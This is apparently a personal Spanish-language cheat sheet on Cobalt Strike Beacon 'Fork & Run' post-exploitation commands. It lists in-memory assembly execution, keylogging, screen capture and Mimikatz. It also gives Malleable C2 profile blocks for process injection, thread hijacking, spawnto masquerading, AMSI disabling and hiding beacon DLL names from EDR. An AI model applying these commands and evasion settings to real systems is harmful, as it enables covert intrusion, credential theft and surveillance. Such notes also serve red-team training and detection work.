---
title: Cobalt Strike — Fork & Run Commands
tags: [cobalt-strike, beacon, cheatsheet, fork-run, opsec, malleable-c2]
---

# Fork & Run Commands

Los comandos Fork & Run **crean un proceso sacrificial** (`spawnto`), inyectan en él una DLL post-ex, ejecutan la operación, y opcionalmente matan el proceso.

## Explicit Fork & Run (requieren spawn)

| Comando | Descripción |
|---------|-------------|
| `execute-assembly <assembly.exe>` | Ejecutar .NET assembly en memoria |
| `powerpick <cmd>` | PowerShell sin powershell.exe |
| `psinject <PID> x64 <cmd>` | PS en proceso existente |
| `portscan <hosts> <ports>` | Escaneo de puertos |
| `keylogger` | Captura de teclado |
| `printscreen` | Captura de pantalla via clipboard |
| `desktop` | VNC viewer |
| `mimikatz <cmd>` | Ejecutar Mimikatz |

## Control de proceso sacrificial

Configuración Malleable C2 — bloque `process-inject`:

```
process-inject {
    set allocator "VirtualAllocEx";
    # Alternativa más silenciosa: NtMapViewOfSection

    transform-x64 {
        prepend "\x90\x90";
    }
    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart";
        # Otras opciones:
        # CreateRemoteThread
        # NtQueueApcThread
        # NtQueueApcThread-s     <- alertable sleep
        # ObfSetThreadContext    <- thread hijacking
        # RtlCreateUserThread
        # SetThreadContext       <- suspende + modifica RIP
    }
}
```

## Thread Spoofing — spoofear call stack

```
post-ex {
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set cleanup "true";
    set pipename "interprocess_##";
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
    set amsi_disable "true";

    transform-x64 {
        strrep "ReflectiveDLL_x64.dll" "";
        strrepex "beacon.x64.dll" "svchost.dll";
    }
}
```

> [!warning] Fork & Run es más ruidoso que API-Only o BOF porque crea procesos nuevos que los EDR pueden monitorear.

> [!tip] Ajustar el `spawnto` a un proceso legítimo del sistema que encaje con el perfil del objetivo.
